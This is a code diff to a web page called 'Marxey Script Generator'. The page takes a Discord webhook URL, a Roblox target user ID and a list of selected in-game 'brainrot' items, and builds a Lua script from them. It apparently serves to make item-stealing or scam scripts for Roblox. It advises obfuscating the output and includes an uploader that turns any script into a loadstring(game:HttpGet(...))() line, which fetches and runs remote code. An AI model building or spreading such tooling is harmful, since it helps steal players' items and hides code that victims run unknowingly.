@@ -88,17 +88,7 @@
     .btn-copy-result.copied{background:linear-gradient(135deg,#16a34a,#15803d)}
     #page-leaderboard{display:none}
     .lb-card{background:rgba(255,255,255,.05);border:1px solid rgba(167,139,250,.3);border-radius:1rem;overflow:hidden}
-    table{width:100%;font-size:.875rem;border-collapse:collapse}
-    th{text-align:left;padding:.75rem 1.25rem;color:#c4b5fd;font-weight:600;background:rgba(255,255,255,.03);border-bottom:1px solid rgba(167,139,250,.2)}
-    th.right,td.right{text-align:right}
-    td{padding:.875rem 1.25rem;border-bottom:1px solid rgba(167,139,250,.1);color:#f1f5f9}
-    tr:hover td{background:rgba(255,255,255,.03)}
-    .lb-user{display:flex;align-items:center;gap:.75rem}
-    .lb-avatar{width:32px;height:32px;border-radius:50%;object-fit:cover}
-    .lb-avatar-ph{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#7c3aed,#db2777);display:flex;align-items:center;justify-content:center;font-size:.8rem;font-weight:700;color:#fff}
-    .lb-count{font-weight:700;background:linear-gradient(90deg,#a78bfa,#f472b6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
     .lb-empty{padding:3rem;text-align:center;color:#c4b5fd;font-size:.875rem}
-    .rank{font-weight:700;color:#fff}
     #loading-overlay{position:fixed;inset:0;background:rgba(15,12,41,.95);display:flex;align-items:center;justify-content:center;z-index:999;color:#c4b5fd;font-size:1rem;gap:.75rem}
     #loading-overlay.hidden{display:none}
     @keyframes spin{to{transform:rotate(360deg)}}
@@ -131,7 +121,6 @@
       <h1>Marxey Script Generator</h1>
       <p class="subtitle" id="subtitle">Sign in to save your settings and appear on the leaderboard.</p>
     </div>
-
     <div class="card">
       <div>
         <label for="webhook">Discord Webhook URL</label>
@@ -176,21 +165,20 @@
         <button class="btn-save" id="save-btn" onclick="saveSettings()">Save Settings</button>
       </div>
     </div>
-
     <div class="card green" id="output-card" style="display:none">
       <div class="output-header">
         <span class="output-label">Generated Script</span>
         <button class="btn-copy" id="copy-btn" onclick="copyScript()">Copy</button>
       </div>
       <pre id="script-output"></pre>
-      <p class="obfuscate-tip">Want to obfuscate your script? <a href="https://wearedevs.com/obfuscator" target="_blank" rel="noopener">Go here</a>, paste your script and click Obfuscate.</p>
+      <p class="obfuscate-tip">Want to obfuscate? <a href="https://wearedevs.com/obfuscator" target="_blank" rel="noopener">Go here</a>, paste your script and click Obfuscate.</p>
     </div>
   </div>
 
   <div id="page-uploader" class="container">
     <div>
       <h1>Loadstring Uploader</h1>
-      <p class="subtitle">Paste your script below, upload it to Pastefy and get a loadstring.</p>
+      <p class="subtitle">Paste your script below, upload to Pastefy and get a loadstring.</p>
     </div>
     <div class="card">
       <div>
@@ -221,7 +209,7 @@
 
 <script>
 const API = 'https://81ec48f1-347e-4197-a23f-3bf85bd5cde2-00-29jmflzj2rw1t.worf.replit.dev/api';
-const OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1483527902564974765&response_type=code&redirect_uri=https%3A%2F%2Ftinglyhubowneristouritobtw.github.io%2FTinglyhubowneristouritobtw.github.io-%2F&scope=identify+identify.premium+guilds.join';
+const OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1483527902564974765&response_type=code&redirect_uri=https%3A%2F%2F81ec48f1-347e-4197-a23f-3bf85bd5cde2-00-29jmflzj2rw1t.worf.replit.dev%2Fapi%2Fauth%2Fdiscord%2Fcallback&scope=identify';
 const STORAGE_KEY = 'marxey_settings';
 const TOKEN_KEY = 'marxey_token';
 const USER_KEY = 'marxey_user';
@@ -322,9 +310,7 @@ function signIn() {
 
 async function logout() {
   const token = localStorage.getItem(TOKEN_KEY);
-  if (token) {
-    fetch(`${API}/auth/logout`, { method: 'POST', headers: { 'Authorization': 'Bearer ' + token } }).catch(() => {});
-  }
+  if (token) fetch(`${API}/auth/logout`, { method: 'POST', headers: { 'Authorization': 'Bearer ' + token } }).catch(() => {});
   localStorage.removeItem(TOKEN_KEY);
   localStorage.removeItem(USER_KEY);
   currentUser = null;
@@ -386,8 +372,7 @@ function buildBrainrotGrid() {
 
 function toggleBrainrot(el) {
   const name = el.getAttribute('data-name');
-  if (selectedBrainrots.has(name)) selectedBrainrots.delete(name);
-  else selectedBrainrots.add(name);
+  if (selectedBrainrots.has(name)) selectedBrainrots.delete(name); else selectedBrainrots.add(name);
   el.classList.toggle('selected', selectedBrainrots.has(name));
   renderTags();
 }
@@ -406,10 +391,7 @@ function renderTags() {
   ).join('');
 }
 
-function removeTag(btn) {
-  selectedBrainrots.delete(btn.getAttribute('data-name'));
-  updateGrid(); renderTags();
-}
+function removeTag(btn) { selectedBrainrots.delete(btn.getAttribute('data-name')); updateGrid(); renderTags(); }
 
 function filterBrainrots(q) {
   q = q.toLowerCase();
@@ -425,9 +407,7 @@ function selectAllBrainrots() {
   updateGrid(); renderTags();
 }
 
-function clearBrainrots() {
-  selectedBrainrots.clear(); updateGrid(); renderTags();
-}
+function clearBrainrots() { selectedBrainrots.clear(); updateGrid(); renderTags(); }
 
 async function lookup() {
   const username = document.getElementById('username').value.trim();
@@ -435,8 +415,7 @@ async function lookup() {
   const btn = document.getElementById('lookup-btn');
   const err = document.getElementById('lookup-error');
   const ok = document.getElementById('lookup-success');
-  btn.disabled = true; btn.textContent = '...';
-  err.textContent = ''; ok.textContent = '';
+  btn.disabled = true; btn.textContent = '...'; err.textContent = ''; ok.textContent = '';
   try {
     const res = await fetch(`${API}/roblox/user/${encodeURIComponent(username)}`);
     if (res.ok) {
@@ -447,9 +426,7 @@ async function lookup() {
       const d = await res.json().catch(() => ({}));
       err.textContent = d.error || 'User not found.';
     }
-  } catch {
-    err.textContent = 'Lookup failed. Enter ID manually.';
-  }
+  } catch { err.textContent = 'Lookup failed. Enter ID manually.'; }
   btn.disabled = false; btn.textContent = 'Look up';
 }
 
@@ -460,7 +437,7 @@ function generate() {
   const brainrots = [...selectedBrainrots];
   if (!webhook) { alert('Please enter a Discord Webhook URL!'); return; }
   if (!brainrots.length) { alert('Please select at least one brainrot!'); return; }
-  const entries = brainrots.map((b, i) => `    ["${b}"] = true${i < brainrots.length - 1 ? ',' : ''}`).join('\n');
+  const entries = brainrots.map((b, i) => `    ["${b}"] = true${i < brainrots.length-1 ? ',' : ''}`).join('\n');
   const customBlock = custom ? `\ntask.spawn(function()\n${custom}\nend)` : '';
   const script =
 `getgenv().TARGET_ID = "${userid}"
@@ -499,9 +476,8 @@ function saveSettings(silent = false) {
   } catch {}
   if (!silent) {
     const btn = document.getElementById('save-btn');
-    const orig = btn.textContent;
     btn.textContent = 'Saved!'; btn.classList.add('saved');
-    setTimeout(() => { btn.textContent = orig; btn.classList.remove('saved'); }, 2000);
+    setTimeout(() => { btn.textContent = 'Save Settings'; btn.classList.remove('saved'); }, 2000);
   }
 }
 
@@ -534,19 +510,12 @@ async function uploadScript() {
     });
     const d = await res.json();
     if (d.success && d.paste?.id) {
-      const rawUrl = `https://pastefy.app/${d.paste.id}/raw`;
-      document.getElementById('result-output').value = `loadstring(game:HttpGet("${rawUrl}"))()`;
+      document.getElementById('result-output').value = `loadstring(game:HttpGet("https://pastefy.app/${d.paste.id}/raw"))()`;
       document.getElementById('upload-result').style.display = 'block';
       btn.textContent = 'Done!'; btn.classList.add('done');
       setTimeout(() => { btn.textContent = 'Upload & Get Loadstring'; btn.classList.remove('done'); btn.disabled = false; }, 3000);
-    } else {
-      btn.textContent = 'Upload failed';
-      setTimeout(() => { btn.textContent = 'Upload & Get Loadstring'; btn.disabled = false; }, 2500);
-    }
-  } catch {
-    btn.textContent = 'Upload failed';
-    setTimeout(() => { btn.textContent = 'Upload & Get Loadstring'; btn.disabled = false; }, 2500);
-  }
+    } else { btn.textContent = 'Upload failed'; setTimeout(() => { btn.textContent = 'Upload & Get Loadstring'; btn.disabled = false; }, 2500); }
+  } catch { btn.textContent = 'Upload failed'; setTimeout(() => { btn.textContent = 'Upload & Get Loadstring'; btn.disabled = false; }, 2500); }
 }
 
 function copyResult() {
